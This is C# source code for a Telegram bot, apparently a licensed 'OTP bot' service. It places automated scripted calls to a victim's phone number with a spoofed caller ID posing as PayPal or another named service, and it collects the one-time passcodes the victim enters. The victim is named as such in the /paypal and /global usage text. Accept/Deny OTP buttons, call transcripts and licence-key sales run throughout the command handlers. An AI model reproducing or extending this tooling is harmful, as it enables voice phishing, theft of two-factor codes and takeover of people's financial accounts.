using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics.Tracing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;
using Telegram.BotAPI.AvailableMethods;
using Telegram.BotAPI.AvailableTypes;
using Telegram.BotAPI.GettingUpdates;
using Telegram.BotAPI.UpdatingMessages;
using Telegram.BotAPI;
using Telegram.BotAPI.AvailableMethods;
using Telegram.BotAPI.AvailableTypes;
using Telegram.BotAPI.GettingUpdates;
using Telegram.BotAPI.UpdatingMessages;

#pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
#pragma warning disable CS8602 // Dereference of a possibly null reference.
#pragma warning disable CS8604 // Possible null reference argument.


namespace Estate_Example
{
    internal class Commands
    {
        [TelegramCommand("call", false, true)]
        public static async Task Call(Update update, List<string> args)
        {
            if (args.Count < 3)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "Invalid arguments. Usage: /call <to> <displayname> <script> <vars>");
                return;
            }

            string to = args[0];
            string displayname = args[1];
            string scriptname = args[2];

            // find script by name
            EstateScript script = Estate.Scripts.Find(x => x.Name.ToLower().Replace(" ", "_") == scriptname.ToLower().Replace(" ", "_"));
            if (script == null)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "❌ Script not found.");
                return;
            }

            // the rest of the arguments are variables
            List<string> vars = args.Skip(3).ToList();

            // get script variables
            string variablesresponse = await Estate.GetScriptVariables(script.Id);
            if (variablesresponse.Contains("error"))
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, $"⚠ <b>Error:</b> {JsonConvert.DeserializeObject<EstateResponse>(variablesresponse).Message}", parseMode: "HTML");
                return;
            }

            // if vars and script vars are not the same length, return
            int varcount = variablesresponse.Count(x => x == ',') + 1;
            if (vars.Count != varcount)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, $"⚠ <b>Error:</b> Invalid number of variables. Expected {varcount}, got {vars.Count}.", parseMode: "HTML");
                return;
            }

            // convert list to dictionary with vars as the values
            List<string> variables = JsonConvert.DeserializeObject<List<string>>(variablesresponse);
            Dictionary<string, string> variablesdict = new Dictionary<string, string>();
            for (int i = 0; i < variables.Count; i++)
            {
                if (i < vars.Count)
                    variablesdict.Add(variables[i], vars[i]);
                else
                    variablesdict.Add(variables[i], "");
            }

            string response = await Estate.StartCall(to, displayname, script.Id, JsonConvert.SerializeObject(variablesdict));
            EstateResponse? estateResponse = JsonConvert.DeserializeObject<EstateResponse>(response);
            if (estateResponse?.Status == "success")
            {
                Console.WriteLine($"[ESTATE] {estateResponse.Message}");
                string callid = estateResponse.Id;

                // update call log
                int timeSinceLastStatusLog = 0;
                string lastcalllog = "";
                int msgid = 0;
                while (true)
                {
                    Thread.Sleep(2000);
                    timeSinceLastStatusLog += 2;

                    string? calllogresponse = await Estate.GetCallLog(callid);

                    EstateCallLog? calllog = null;
                    try { calllog = JsonConvert.DeserializeObject<EstateCallLog>(calllogresponse); }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }

                    if (lastcalllog != calllog.StatusLog)
                    {
                        lastcalllog = calllog.StatusLog;

                        if (string.IsNullOrWhiteSpace(calllog.StatusLog))
                            continue;

                        var replyMarkup = new InlineKeyboardMarkup
                        {
                            InlineKeyboard = new InlineKeyboardButton[][]
                            {
                                new InlineKeyboardButton[]
                                {
                                    InlineKeyboardButton.SetCallbackData("Hangup Call", "Hangup:" + callid)
                                }
                            }
                        };

                        // if log contains "OTP:" then add accept/deny buttons
                        if (calllog.StatusLog.Contains("OTP:"))
                        {
                            replyMarkup.InlineKeyboard = new InlineKeyboardButton[][]
                            {
                                new InlineKeyboardButton[]
                                {
                                    InlineKeyboardButton.SetCallbackData("Accept OTP", "Accept_OTP:" + callid),
                                    InlineKeyboardButton.SetCallbackData("Deny OTP", "Deny_OTP:" + callid),
                                    InlineKeyboardButton.SetCallbackData("Hangup Call", "Hangup:" + callid)
                                }
                            };
                        }

                        timeSinceLastStatusLog = 0;

                        if (msgid == 0)
                        {
                            Message msg = Telegram.client.SendMessage(update.Message.Chat.Id, calllog.StatusLog, disableWebPagePreview: true, replyMarkup: replyMarkup);
                            msgid = msg.MessageId;
                        }
                        else
                            Telegram.client.EditMessageText(update.Message.Chat.Id, msgid, calllog.StatusLog, disableWebPagePreview: true, replyMarkup: replyMarkup);

                        if (calllog.Transcript != "")
                        {

                            await Telegram.client.SendAudioAsync(update.Message.Chat.Id, calllog.Transcript, title: "transcript.mp3");
                            break;
                        }
                    }

                    if (timeSinceLastStatusLog > 60)
                    {
                        // Esate Hangup
                        Telegram.client.SendMessage(update.Message.Chat.Id, "⏰ Call timed out after 60 seconds.");
                        break;
                    }
                }
            }
            else
            {
                if (!string.IsNullOrWhiteSpace(estateResponse?.Message))
                    Telegram.client.SendMessage(update.Message.Chat.Id, $"⚠ <b>Error:</b> {estateResponse?.Message}", parseMode: "HTML");
                else
                    Telegram.client.SendMessage(update.Message.Chat.Id, $"⚠ <b>Error:</b> Unknown error, if the problem persists, contact an admin.\n\n<i>Have you checked if your inputs are correct? Maybe a wrong phone number?</i>", parseMode: "HTML");
            }
        }

        [TelegramCommand("paypal", false, true)]
        public static async Task Paypal(Update update, List<string> args)
        {
            try { await Call(update, new List<string>() { args[0], "PayPal", "paypal", args[1] }); }
            catch { Telegram.client.SendMessage(update.Message.Chat.Id, "<b>▪️ | Usage :</b> \n<b>⤷ /paypal VictimNumber Name</b>\n\n<b>▪️ | Example :</b> \n <b>⤷ /paypal 14142412631 Jackson</b>", parseMode: "HTML"); }
        }

        [TelegramCommand("global", false, true)]
        public static async Task Global(Update update, List<string> args)
        {
            try { await Call(update, new List<string>() { args[0], args[1], "Global", args[2], args[3], args[4] }); }
            catch { Telegram.client.SendMessage(update.Message.Chat.Id, "<b>▪️ | Usage :</b> \n<b>⤷ /global VictimNumber CallerID Digits Name Service</b>\n\n<b>▪️ | Example :</b> \n <b>⤷ /global 14142412631 PAYPALSECURITY 6 Jackson PayPal</b>", parseMode: "HTML"); }
        }

        [TelegramCommand("help", false, false, "start", "?")]
        public static async Task Help(Update update, List<string> args)
        {
            // write a beautiful help command displaying all commands and their descriptions
            string help = $"📞 <b>{Settings.settings.Brand.Name}</b>\n";

            help += "\n <b>OTP Stuff➧</b>\n";
            help += "⤷☎️ | /call - <i>Start a call</i>\n";
            help += "⤷🤖 | /scripts - <i>List all scripts</i>\n";
            help += "⤷🤖 | /script - <i>View more details about script</i>\n";
            help += "\n <b>Shortcuts➧</b>\n";
            help += "⤷📲 | /paypal - <i>Shortcut for paypal otp</i>\n";
            help += "⤷🌍 | /global - <i>Shortcut for anyting</i>\n";

            help += "\n <b>Other Commands➧</b>\n";
            help += "⤷🔑 | /redeem (license) - <i>Redeem a license to your account</i>\n";
            help += "⤷👤 | /info - <i>Shows information about your account</i>\n";
            help += "⤷✍️ | /guide - <i>Shows how to call and use scripts</i>\n";

            help += "\n <b>Bot Commands➧</b>\n";
            help += "⤷🆘 | /help - <i>Show this message</i>\n";
            help += "⤷🔸 | /ping - <i>Check if the bot is online</i>\n";
            help += "\n <i>Supports</i> 🇺🇸🇨🇦🇨🇱🇦🇺🇦🇹🇧🇪🇩🇰🇫🇷🇩🇪🇬🇷🇮🇲🇨🇮🇮🇹🇯🇵🇵🇼🇱🇺🇲🇪🇵🇹🇸🇬🇪🇸🇸🇪\n";

            if (Authentication.CheckUser(update.Message.From, true, false) == 1) // admin
            {
                help += "\n🔧 <b>Admin</b>\n";
                help += "🔸 /ban (username/id) - <i>Ban/unban a user from using the bot</i>\n";
                help += "🔸 /genkey (amount) (days) (days to expire) - <i>Generate license keys for the bot</i>\n";
                help += "🔸 /status - <i>View statistics of Users, and keys</i>\n";
                help += "🔸 /balance - <i>View balance of your Estate account</i>\n";
                help += "🔸 /keys - <i>Export all license keys</i>\n";
                help += "🔸 /save - <i>Save Users, Keys and Scripts from memory</i>\n";
                help += "🔸 /load - <i>Load Users, Keys and Scripts from .json files</i>\n";
            }
            // send the help message
            Telegram.client.SendMessage(update.Message.Chat.Id, help, parseMode: "HTML", disableWebPagePreview: true);
        }

        [TelegramCommand("scripts", false, false, "listscripts")]
        public static async Task Scripts(Update update, List<string> args)
        {
            // list all scripts
            string scripttext = "";
            foreach (var script in Estate.Scripts)
                scripttext += $"<code>{script.Name.Replace(" ", "_")}</code> - <b>{script.Description}</b>\n";

            Telegram.client.SendMessage(update.Message.Chat.Id, scripttext, parseMode: "HTML");
        }


        [TelegramCommand("script", false, false)]
        public static async Task Script(Update update, List<string> args)
        {
            if (args.Count < 1)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "Invalid arguments. Usage: /script <name>");
                return;
            }

            string scriptname = args[0];

            // get script variables and list them, and give usage example
            EstateScript script = Estate.Scripts.Find(x => x.Name.ToLower().Replace(" ", "_") == scriptname.ToLower().Replace(" ", "_"));
            if (script == null)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "❌ Script not found.");
                return;
            }

            // get script variable
            string variablesresponse = await Estate.GetScriptVariables(script.Id);
            if (variablesresponse.Contains("error"))
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, $"⚠ <b>Error:</b> {JsonConvert.DeserializeObject<EstateResponse>(variablesresponse).Message}", parseMode: "HTML");
                return;
            }
            List<string> variables = JsonConvert.DeserializeObject<List<string>>(variablesresponse);

            string responsetext = $"❔ <b>{script.Name}</b>\n";
            responsetext += $"\n🔹 Variables: ";
            foreach (string variable in variables)
                responsetext += $"<code>{variable}</code>, ";

            // remove last ,
            responsetext = responsetext.Remove(responsetext.Length - 2);

            // show usage example
            responsetext += $"\n\n🔸 Usage: <code>/call +14159494238 CALLER_ID {script.Name.Replace(" ", "_")}";
            foreach (string variable in variables)
                responsetext += $" ({variable})";

            responsetext += "</code>";

            Telegram.client.SendMessage(update.Message.Chat.Id, responsetext, parseMode: "HTML");
        }

        [TelegramCommand("info", false, false)]
        public static async Task expire(Update update, List<string> args)
        {

            JsonUser user = Authentication.Users.Where(x => x.Id == update.Message.From.Id).FirstOrDefault();
            if (user != null)
            {
                TimeSpan timeLeft = user.Expiry - DateTime.UtcNow;
                string timeLeftString = "";

                if (timeLeft.Days > 0)
                    timeLeftString += $"{timeLeft.Days} days, ";
                if (timeLeft.Hours > 0)
                    timeLeftString += $"{timeLeft.Hours} hours, ";

                Telegram.client.SendMessage(update.Message.Chat.Id, $"<b>🌎 OTP - Info </b>\n\n<b>👤 User➧</b>\n <b>⤷ |</b> <i>{user.Username}</i> \n\n <b>⏰ Expiery➧</b>\n<b>⤷ |</b> <i> {user.Expiry.ToString("dd/MM/yyyy HH:mm:ss")} ({timeLeftString.TrimEnd(',', ' ')})</i>", parseMode: "HTML", disableWebPagePreview: true);
            }
        }

        [TelegramCommand("guide", false, false)]
        public static async Task Guide(Update update, List<string> args)
        {

            JsonUser user = Authentication.Users.Where(x => x.Id == update.Message.From.Id).FirstOrDefault();
            if (user != null)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, $"<b>🌎 OTP - Guide </b>\n⤷ | Select what script u want to use from the list /scripts | /script\n\n⤷ | Once using the script it will display a call format (call with that format)\n\n⤷ | Paypal example: (/call 14142412631 Paypal Paypal Frank)", parseMode: "HTML", disableWebPagePreview: true);
            }
        }


        [TelegramCommand("redeem", false, false)]
        public static async Task Redeem(Update update, List<string> args)
        {
            if (args.Count < 1)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "Invalid arguments. Usage: /redeem <license>");
                return;
            }

            string key = args[0];

            // check if key is valid
            License FoundKey = KeySystem.Keys.Where(x => x.Key == key).FirstOrDefault();
            if (FoundKey == null)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "❌ Invalid license.");
                return;
            }

            // check if key is already redeemed
            if (FoundKey.Used)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "❌ License already redeemed.");
                return;
            }

            // check if expired
            if (FoundKey.Expiry < DateTime.UtcNow)
            {
                Telegram.client.SendMessage(update.Message.Chat.Id, "❌ License expired.");
                return;
            }

            // Add license to user
            JsonUser user = Authentication.Users.Where(x => x.Id == update.Message.From.Id).FirstOrDefault();
            if (user != null)
            {
                // update key
                FoundKey.Used = true;
                FoundKey.Expiry = DateTime.UtcNow;
                KeySystem.SaveKeys();

                if (user.Keys == null)
                    user.Keys = new List<string>();

                user.Keys.Add(FoundKey.Key);

                // if expiry is epoch, set it to now
                if (user.Expiry == DateTime.UnixEpoch)
                    user.Expiry = DateTime.UtcNow;

                // if expiry is less than now, set it to now
                if (user.Expiry < DateTime.UtcNow)
                    user.Expiry = DateTime.UtcNow;

                // add days to expiry
                user.Expiry = user.Expiry.AddDays(FoundKey.Days);
                Authentication.SaveUsers();

                // calculate time left
                TimeSpan timeLeft = user.Expiry - DateTime.UtcNow;
                string timeLeftString = "";

                if (timeLeft.Days > 0)
                    timeLeftString += $"{timeLeft.Days} days, ";
                if (timeLeft.Hours > 0)
                    timeLeftString += $"{timeLeft.Hours} hours, ";

                Telegram.client.SendMessage(update.Message.Chat.Id, $"✅ License redeemed.\nYour new expiry is: {user.Expiry.ToString("dd/MM/yyyy HH:mm:ss")} ({timeLeftString.TrimEnd(',', ' ')} left).");
            }
        }

        [TelegramCommand("ping", false, false)]
        public static async Task Ping(Update update, List<string> args)
        {
            Telegram.client.SendMessage(update.Message.Chat.Id, "🤖 Bot is online");
        }


        [TelegramCommand("BUTTON:Accept_OTP", false, false)]
        public static async Task Accept_OTP(Update update, List<string> args) => Console.WriteLine("[ESTATE] " + await Estate.TriggerEvent("Accept_OTP", args[0]));

        [TelegramCommand("BUTTON:Deny_OTP", false, false)]
        public static async Task Deny_OTP(Update update, List<string> args) => Console.WriteLine("[ESTATE] " + await Estate.TriggerEvent("Deny_OTP", args[0]));

        [TelegramCommand("BUTTON:Hangup", false, false)]
        public static async Task Hangup(Update update, List<string> args) => Console.WriteLine("[ESTATE] " + await Estate.TriggerEvent("Hangup", args[0]));
    }
}